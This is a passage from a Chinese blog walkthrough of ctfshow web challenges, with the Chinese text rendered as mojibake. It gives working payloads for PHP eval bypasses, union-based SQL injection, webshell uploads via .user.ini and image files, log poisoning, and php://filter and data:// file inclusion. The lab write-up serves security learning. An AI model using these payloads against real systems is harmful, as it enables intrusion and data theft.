alt="59"><br>‰πüÂèØ‰ª•‰ΩøÁî®include()Êñá‰ª∂ÂåÖÂê´:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;POST‰º†ÂÖ•Ôºöc&#x3D;echo include($_GET[1]);&#x2F;&#x2F;urlËøûÊé•Ôºö&#x2F;?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>‰πãÂêébase64Ëß£ÂØÜÂæóÂà∞flag„ÄÇ</p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>ÂàöÊâìÂºÄÁúãÂà∞<br><img src="https://img-blog.csdnimg.cn/56fd117279cc402ab4083d3e022ec80a.png" alt="71"><br>post‰º†Âéª‰∏Ä‰∏™ËØïËØïÔºå<code>c=include(&#39;flag.php&#39;);</code>ÔºåÁªìÊûúÈÉΩË¢´ÈÄöÈÖçÁ¨¶Âç†È¢Ü‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/bd4e04e75e79476db81a728aa3dbd6e8.png" alt="71"><br>‰∏∫‰ªÄ‰πàÂë¢ÔºüÂèÇËÄÉwp‰πãÂêéÂèëÁé∞Â§ßÂÆ∂ÁöÑÈÉΩÊòØÁªôÂá∫index.php„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ‰Ω†‰ª¨Âú®ÁÇ´ÊäÄÂêóÔºü</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>‰Ω†Ë¶Å‰∏äÂ§©ÂêóÔºü<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÊ†∑ÁúãÁöÑËØù[0-9][a-z]ÈÉΩË¢´ËøáÊª§‰∫Ü„ÄÇÊÄ™‰∏çÂæó</p><blockquote><p>$s &#x3D; ob_get_contents();&#x2F;&#x2F;ÂæóÂà∞ÁºìÂÜ≤Âå∫ÁöÑÊï∞ÊçÆ„ÄÇ<br>ob_end_clean();&#x2F;&#x2F;‰ºöÊ∏ÖÈô§ÁºìÂÜ≤Âå∫ÁöÑÂÜÖÂÆπÔºåÂπ∂Â∞ÜÁºìÂÜ≤Âå∫ÂÖ≥Èó≠Ôºå‰ΩÜ‰∏ç‰ºöËæìÂá∫ÂÜÖÂÆπ„ÄÇ</p></blockquote><p>ÂèØ‰ª•‰∏çËÆ©‰ªñÊâßË°åÂêéÈù¢ÁöÑÂÜÖÂÆπÔºåËøôÊ†∑Â∞±‰∏ç‰ºöË¢´ËøáÊª§‰∫Ü„ÄÇÂà©Áî®<code>exit();</code>Áõ¥Êé•ÂÅúÊ≠¢ÂêéÈù¢ÁöÑÁ®ãÂ∫è„ÄÇÁÑ∂ÂêéÊâßË°å<code>c=include(&#39;/flag.txt&#39;);exit();</code>ÊãøÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/689f068a3e7842b48af6b07256822c61.png" alt="71"></p><h4 id="Áü•ËØÜÁÇπ-1"><a href="#Áü•ËØÜÁÇπ-1" class="headerlink" title="Áü•ËØÜÁÇπ"></a>Áü•ËØÜÁÇπ</h4><p><a href="https://blog.csdn.net/qq_33862778/article/details/80787510?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=6">php‰∏≠obÂáΩÊï∞ÁöÑÁî®Ê≥ï</a></p><h2 id="SQLÊ≥®ÂÖ•ÁØá"><a href="#SQLÊ≥®ÂÖ•ÁØá" class="headerlink" title="SQLÊ≥®ÂÖ•ÁØá"></a>SQLÊ≥®ÂÖ•ÁØá</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><blockquote><p><code>//ÊãºÊé•sqlËØ≠Âè•Êü•ÊâæÊåáÂÆöIDÁî®Êà∑ $sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; </code></p></blockquote><p>ËøôÈáå‰ºöÊääËæìÂÖ•ÁöÑid‰ª•getÁöÑÂΩ¢ÂºèÁõ¥Êé•ÈÄí‰∫§Âà∞ÂêéÂè∞ÂíåÊü•ËØ¢ËØ≠Âè•ËøõË°åÁÆÄÂçïÁöÑÂ≠óÁ¨¶‰∏≤ÊãºÊé•ÁöÑËøáÁ®ãÔºåÂêåÊó∂Ê†πÊçÆËøô‰∏™È¢òÁõÆÁöÑÊü•ËØ¢Êù°‰ª∂ÔºåÂèØ‰ª•ÁåúÊµãusername‰∏∫‰∏∫flagÁöÑÁî®Êà∑‰ªñÁöÑ‰ø°ÊÅØÂ∞±ÊòØÊàë‰ª¨ÊâÄÈúÄË¶ÅÁöÑ„ÄÇ<br>‰ΩÜÊòØÁΩëÈ°µÈáåÊâÄÂ±ïÁ§∫ÁöÑ24‰∏™Áî®Êà∑Âπ∂Ê≤°ÊúâÊàë‰ª¨ÊâÄÈúÄË¶ÅÁöÑflag<br>ËøôÈáå‰∏ªË¶ÅÁöÑÊÄùË∑ØÂ∞±ÊòØÁî®orËøõË°åÊà™Êñ≠ÔºåÁÑ∂ÂêéorÂêéÈù¢Ë∑üÊàë‰ª¨ÊâÄÈúÄË¶ÅÊü•ËØ¢ÁöÑËØ≠Âè•<br>‚ÄòÊàë‰ª¨‰º†ÂÖ•ÁöÑËØ≠Âè•‚Äô<br>È¶ñÂÖàÊàë‰ª¨ÁªôÂâçÈù¢‰∏Ä‰∏™Êü•ËØ¢ËØ≠Âè•‰∏Ä‰∏™‰∏çÂèØËÉΩËææÊàêÁöÑÊù°‰ª∂ÂéªÊà™Êñ≠ÂÆÉÔºåÂç≥-1‚Äô<br>ÁÑ∂ÂêéÁî®orÂä†‰∏äÊàë‰ª¨ÊâÄË¶ÅÊü•ËØ¢ÁöÑ or username &#x3D; ‚Äòflag‚Äô.Êàë‰ª¨ËØ≠Âè•Â§ñÈù¢ËøòÊúâ‰∏Ä‰∏™ÂºïÂè∑„ÄÇÊâÄ‰ª•Êàë‰ª¨‰∏çË¶ÅÊúÄÂêé‰∏Ä‰∏™ÂºïÂè∑<br>ÊúÄÂêéÁöÑËØ≠Âè•Â∞±ÊòØËøôÊ†∑ -1‚Äô or username &#x3D; ‚Äòflag<br><strong>ÊñπÊ≥ï‰∫å</strong><br>Áî®order byÂà§Êñ≠Â≠óÊÆµÔºåÁ°ÆËÆ§Â≠óÊÆµÊï∞‰∏∫3<br><img src="https://img-blog.csdnimg.cn/e5cf7a706ab9414b8b4efa485c2b3698.png" alt="171"><img src="https://img-blog.csdnimg.cn/561caf246f524743916e4c290284d839.png" alt="171"><br>Êé•ÁùÄÁî®ËÅîÂêàÊ≥®ÂÖ•ÁàÜÂá∫ÂΩìÂâçÊï∞ÊçÆÂ∫ìÁöÑÊâÄÊúâË°®Âêç</p><pre><code>-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()--+</code></pre><p>Ê†πÊçÆÈ¢òÁõÆÁªôÁöÑSQLËØ≠Âè•Âà§Êñ≠ÔºåflagÂ∞±Âú®Â≠óÊÆµpasswordÈáåÔºå‰∏îÊóÅËæπÂØπÂ∫îÁöÑÂ≠óÊÆµusernameÂÄº‰∏∫flagÔºåÊïÖÊûÑÈÄ†payloadÁõ¥Êé•Êü•Áúãflag</p><pre><code>-1&#39; union select 1,2,password from ctfshow_user where username = &#39;flag&#39; --+</code></pre><p><img src="https://img-blog.csdnimg.cn/8d1fc8e46c754886bebd3bc063318f9f.png" alt="171"></p><h4 id="Áªº‰∏ä"><a href="#Áªº‰∏ä" class="headerlink" title="Áªº‰∏ä"></a>Áªº‰∏ä</h4><p>ÁàÜÂá∫ÊúâÂì™‰∫õ‰ΩçÁΩÆÂèØ‰ª•ËøõË°åËæìÂá∫Êï∞ÊçÆ<br><code>1&#39; order by 3--+</code></p><p>Êü•ÁúãÊï∞ÊçÆÂ∫ìÂêçÂ≠ó<br><code>1&#39; union select 1,2,database()--+</code></p><p>ÁàÜÁ†¥Ë°®ÂêçÔºö<br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p><p>ÁàÜÁ†¥ÂàóÂêçÔºö<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code></p><p>ÁàÜÁ†¥Êï∞ÊçÆÔºö<br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></p><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"> <span class="token comment">//ÊãºÊé•sqlËØ≠Âè•Êü•ÊâæÊåáÂÆöIDÁî®Êà∑</span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from user where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Êü•ÁúãÊï∞ÊçÆÂ∫ìÂêçÂ≠ó</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/4c72f7bb235a43aabfc05f68a47b99b8.png" alt="172"><br>ÁàÜÁ†¥Ë°®ÂêçÔºö<br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172"><br>Âá∫Áé∞‰∏§‰∏™Ë°®ÂêçÔºåÊúâÁå´ËÖªÔºÅÁªßÁª≠ÂæÄ‰∏ãÂÅö<br>ÁàÜÁ†¥Ë°®Ôºàctfshow_userÔºâÁöÑÂàóÂêçÔºö<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/c47f98754ada4e5f89973323c64eea9a.png" alt="172"></p><p>ÁàÜÁ†¥Êï∞ÊçÆÔºö<br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/e652af16a26a46b989ac1a6a87572daa.png" alt="172">ÊàñÂè™Êü•ÊâæÂØÜÁ†Å<br><code>1&#39; union select 1,2,password FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/b06dc2683d1c4bbf85eb0e874886d09f.png" alt="172"><br>ÊàñÁ≤æÂáÜÊü•ÊâæflagÁöÑÂØÜÁ†Å<br><code>1&#39; union select 1,username,password FROM ctfshow_user where username =&#39;flag&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/483e7992aec84c5f8801785f651f3ff5.png" alt="172"><br>ÁúãÊù•flagÂ∫îËØ•Âú®Âè¶‰∏Ä‰∏™Ë°®‰∏≠„ÄÇ<br><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172">Á°ÆÂÆûÔºö<br><img src="https://img-blog.csdnimg.cn/2a990c58086647cc8f591556d9b90096.png" alt="172"></p><h2 id="Êñá‰ª∂‰∏ä‰º†ÁØá"><a href="#Êñá‰ª∂‰∏ä‰º†ÁØá" class="headerlink" title="Êñá‰ª∂‰∏ä‰º†ÁØá"></a>Êñá‰ª∂‰∏ä‰º†ÁØá</h2><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>‰∏ä‰º†ÂõæÁâáÈ©¨ÊäìÂåÖÊîπÂêéÁºÄ<br><img src="https://img-blog.csdnimg.cn/1e8ea89704a54df79708da76200c7d64.png" alt="1"><br>Êç¢‰∫Üphp5ÔºåphtmlËöÅÂâëËøû‰∏ç‰∏äÔºåÂæàÊúâÂèØËÉΩÊòØphp5ÔºåphtmlÊ≤°ÊúâË¢´Ëß£ÊûêÊàêphpÊñá‰ª∂ÊâßË°å„ÄÇËØ¶ÊÉÖËØ∑ÂèÇËÄÉ<a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397"> .htaccess Âíå.user.ini ÈÖçÁΩÆÊñá‰ª∂Â¶ôÁî® </a><br>ÊâÄ‰ª•Ë¶Å‰∏ä‰º†‰∏Ä‰∏™.user.iniÈÖçÁΩÆÊñá‰ª∂ÔºåÂõ†‰∏∫ËØ•ÁΩëÁ´ôÊòØnginxxÁ≥ªÁªü</p><p>ÂêåÊ†∑Ôºå‰∏ä‰º†pngÊñá‰ª∂ÔºåburpÊäìÂåÖ‰øÆÊîπÊñá‰ª∂‰ø°ÊÅØÔºåÊñá‰ª∂Âêç‰øÆÊîπ‰∏∫.user.iniÔºåÂÜÖÂÆπÊ∑ªÂä†<strong>auto_prepend_file&#x3D;1.png</strong>„ÄÇÂÜç‰∏ä‰º†‰∏Ä‰∏™Âêç‰∏∫1.pngÁöÑÂõæÁâáÈ©¨Âç≥ÂèØ</p><p><img src="https://img-blog.csdnimg.cn/1e185a3845754cbc86e795bf433dbd5c.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/4d12a3b8aa684b9981b21fe50035dde1.png" alt="3"><br>ÊúÄÂêéËÆøÈóÆ**&#x2F;url&#x2F;upload&#x2F;index.php<strong>ÔºåÁî®</strong>12&#x3D;system(‚Äòcat &#x2F;var&#x2F;www&#x2F;html&#x2F;f*‚Äô);**ËæìÂÖ•ÂëΩ‰ª§Ëé∑ÂèñflagÂ∞±Â•Ω</p><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p><img src="https://img-blog.csdnimg.cn/774a6099bce54cc2b80d994fa6ab641e.png" alt="1"><br>ÂÖà‰∏ä‰º†Êú®È©¨ÂõæÁâáÔºåÂú®‰∏ä‰º†.user.iniÊñá‰ª∂<br><img src="https://img-blog.csdnimg.cn/772c7be1ba234b79876564de940ce075.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/f4c39dfc13344f92baaf74f1c1131fdb.png" alt="3"><br><img src="https://img-blog.csdnimg.cn/235addb3fca1469cb74c46fecab5ad69.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/aa4c2da456f34dd3989d31231b939a1a.png" alt="5"><br>ÂæóÂà∞flag„ÄÇ</p><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>‰∏ä‰º†ÊôÆÈÄöÊñá‰ª∂ÊòØ‰∏çË°å‰∫ÜÔºåphpÂ§ßÂÜô‰∏∫PHPÊòæÁ§∫‰∏ä‰º†ÊàêÂäü<br><img src="https://img-blog.csdnimg.cn/f2885b09f69d4050b9e4700968b9b50b.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/5642e7dad85e49399077a6ae2e1aa9be.png" alt="1"></p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>‰∏ä‰∏ÄÈ¢òÁöÑÊñπÊ≥ï‰∏çËÉΩÁî®‰∫ÜÔºåÂèØËÉΩÊòØËøáÊª§‰∫Ü‰∏Ä‰∫õ‰∏úË•øÔºåÈááÁî®‰∫åÂàÜÊ≥ïÁúãÁúãÊòØÂì™ÈáåÂá∫ÈóÆÈ¢ò‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/ffa7b02671d74acfbb1625163c046b88.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/21b518e23e66443893f63357d6fede21.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/25f2dc51ac204ded8df334d61ac99fc9.png" alt="3"><br>ÁúãÊù•ÊòØËøáÊª§‰∫Ü**[]<strong>ÔºåÂèØ‰ª•Áî®</strong>{}**‰ª£Êõø<br><img src="https://img-blog.csdnimg.cn/49012703e34c48dfbc3df84e4bbe7105.png" alt="3"><br>Ââ©‰∏ãÊ≠•È™§Âíå‰∏äÈ¢ò‰∏ÄÊ†∑„ÄÇ</p><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>Âú®url&#x2F;upload‰∏≠Êü•ÁúãÊ∫êÁ†ÅÂèØ‰ª•ÁúãÂà∞ÊúâËøôÊ†∑‰∏ÄÊÆµ‰ª£Á†ÅÔºö<br>**function check($str){<br>           return !preg_match(‚Äò&#x2F;php|{|[|;&#x2F;i‚Äô, $str);<br>       }**<br>       ÂèØ‰ª•ÂèëÁé∞**phpÔºå{Ôºå[Ôºå;**Ë¢´ËøáÊª§‰∫ÜÔºåÈÇ£‰πà‰∏ÄÂè•ËØùÊú®È©¨ÂèØ‰ª•Áî®**<?= system('cat ../*.ph*')?>**Êù•‰ª£Êõø„ÄÇ<br>       È¶ñÂÖà‰º†ÂÖ•**.user.iniÊñá‰ª∂**ÂÜôÂÖ•**auto_append_file&#x3D;2.png**ÊÑèÊÄùÊääÂêåÁõÆÂΩï‰∏ãÁöÑ2.pngÊñá‰ª∂ÂΩì‰ΩúphpÊñá‰ª∂Êù•ÊâßË°å„ÄÇ<br>       ‰πãÂêéËÆøÈóÆurl&#x2F;upload&#x2F;Êü•ÁúãÊ∫êÁ†Å‰æøÂèØÂæóÂà∞flag„ÄÇ<br>       <img src="https://img-blog.csdnimg.cn/51c1859b5aef47c6bf2af0bbfc945edd.png" alt="1"></p><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>Áõ∏ÊØî‰∫é‰∏äÈ¢òÂ§öËøáÊª§‰∫ÜlogÔºå‰∏çËøáÊ≤°‰∫ãÔºåÊåâ‰∏äÈ¢òÂÅöÊ≥ï‰πüÂèØ‰ª•„ÄÇ‰æùÊóßÂæóÂà∞flag„ÄÇ</p><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>ÂèëÁé∞system‰∏çËÉΩÁî®‰∫ÜÔºåÂ¶ÇÊûúÁî®ÂÖ∂‰ªñÂáΩÊï∞Êù•‰ª£ÊõøsystemÁöÑËØùÔºåËøòË¶ÅÁî®Êã¨Âè∑**()<strong>,ÂèëÁé∞</strong>ÔºàÔºâ**‰πüË¢´ËøáÊª§‰∫ÜÔºåÂõ†Ê≠§Âú®ÁΩë‰∏äÊü•‰∫Ü‰∏Ä‰∏ãÔºå</p><blockquote><p>php‰∏≠ÔºåÂèçÂºïÂè∑**&#96;**ÂèØ‰ª•Áî®Êù•ÊâßË°åÁªàÁ´ØÂëΩ‰ª§„ÄÇ</p></blockquote><p>Âõ†Ê≠§ÂÜôÂÖ•**<?= `cat fl*`?>**Êù•ÊâßË°åÂëΩ‰ª§„ÄÇÂæóÂà∞flag„ÄÇ</p><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>ÁªèËøáÊµãËØïÂèëÁé∞ÂèçÂºïÂè∑ &#96;ÂíåÁ©∫Ê†º‰πüË¢´ËøáÊª§‰∫Ü„ÄÇÁúãÂà∞Âà´‰∫∫ÁöÑwpÂêéÊâçÁü•ÈÅìÂéüÊù•ÂèØ‰ª•‰∏ä‰º†Âà∞Êó•ÂøóÈáåÔºå‰ΩÜÊòØlogË¢´ËøáÊª§‰∫Ü„ÄÇphpÈáåÂèØ‰ª•Áî®**.<strong>Êù•ÊãºÊé•log„ÄÇÁü•ÈÅìsever‰∏∫nginx,Êó•ÂøóÊñá‰ª∂ÈªòËÆ§ÊîæÂú®</strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<strong>Èáå„ÄÇ<br>ÊâÄ‰ª•ÊúâÊÄùË∑Ø‰∫Ü„ÄÇ<br>È¶ñÂÖà‰∏ä‰º†</strong>.user.ini**ÔºåÁÑ∂Âêé‰∏ä‰º†2.pngÊñá‰ª∂ÂÜôÂÖ•<?=include"/var/lo"."g/niginx.access.lo"."g"?> ÂêåÊó∂UAÊîπ‰∏∫‰∏ÄÂè•ËØùÊú®È©¨„ÄÇ<br>Á®çÂêéËöÅÂâëËøûÂÖ•url&#x2F;upload&#x2F;<br><img src="https://img-blog.csdnimg.cn/6a94f2203af149be8e487afe9fe74dd9.png" alt="1"><br>Âç≥ÂèØÊü•Êâæflag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/e4b85afb4d144b9785e81f42c99bc3f2.png" alt="2"></p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>‰∏é‰∏äÈ¢ò‰∏çÂêåÁöÑÊòØËøõË°å‰∫ÜÊñá‰ª∂Â§¥ÁöÑÈ™åËØÅÔºåÂè™ÈúÄÂú®Êñá‰ª∂Â§¥Âä†‰∏äGIF89aÔºåÂÖ∂‰ªñÂíå‰∏äÈ¢ò‰∏ÄÊ†∑„ÄÇ<br>ËöÅÂâëËøûÊé•ÂæóÂà∞flag„ÄÇ</p><h2 id="Êñá‰ª∂ÂåÖÂê´"><a href="#Êñá‰ª∂ÂåÖÂê´" class="headerlink" title="Êñá‰ª∂ÂåÖÂê´"></a>Êñá‰ª∂ÂåÖÂê´</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 10:52:43# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 10:54:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadÔºö<code>http://56337a28-b2ea-474e-b82d-03c38b2e75f1.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3tmYTljNGExYS01NzE1LTQwOGEtYWU0Yy00ZGU2NzRiM2M4YzZ9Ijs&#x3D;<br>Ëß£ÂØÜÂæóÂà∞flagÔºöctfshow{fa9c4a1a-5715-408a-ae4c-4de674b3c8c6}</p><h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:10:14# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>str_replace</strong>ÂáΩÊï∞Ôºö</p><blockquote><p>ËØ≠Ê≥ï</p><p>str_replace(find,replace,string,count)</p><p>ÂèÇÊï∞ ÊèèËø∞ find ÂøÖÈúÄ„ÄÇËßÑÂÆöË¶ÅÊü•ÊâæÁöÑÂÄº„ÄÇ replace ÂøÖÈúÄ„ÄÇËßÑÂÆöÊõøÊç¢ find ‰∏≠ÁöÑÂÄºÁöÑÂÄº„ÄÇ string<br>    ÂøÖÈúÄ„ÄÇËßÑÂÆöË¢´ÊêúÁ¥¢ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ count ÂèØÈÄâ„ÄÇÂØπÊõøÊç¢Êï∞ËøõË°åËÆ°Êï∞ÁöÑÂèòÈáè„ÄÇ</p></blockquote><p>ÂèØ‰ª•‰ΩøÁî®dataÂçèËÆÆÂØπÂÜÖÂÆπËøõË°åbase64Âä†ÂØÜ**?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]**<br>Âä†ÂØÜÂÜÖÂÆπ‰∏∫system(‚Äòcat flag.php‚Äô);</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:26:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token 